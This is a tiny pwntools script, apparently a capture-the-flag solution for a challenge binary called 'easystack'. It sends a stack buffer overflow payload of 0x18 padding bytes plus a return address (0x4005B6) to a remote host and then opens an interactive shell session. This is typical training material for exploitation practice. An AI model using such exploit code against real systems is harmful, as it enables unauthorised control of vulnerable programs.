from pwn import *
context(arch = "amd64", os = "linux", log_level = "Debug")
io = process("./easystack")
io = remote("119.45.112.147", 20002)

# io.recvuntil("challege!")
io.sendline("A" * 0x18 + p64(0x4005B6))
io.interactive()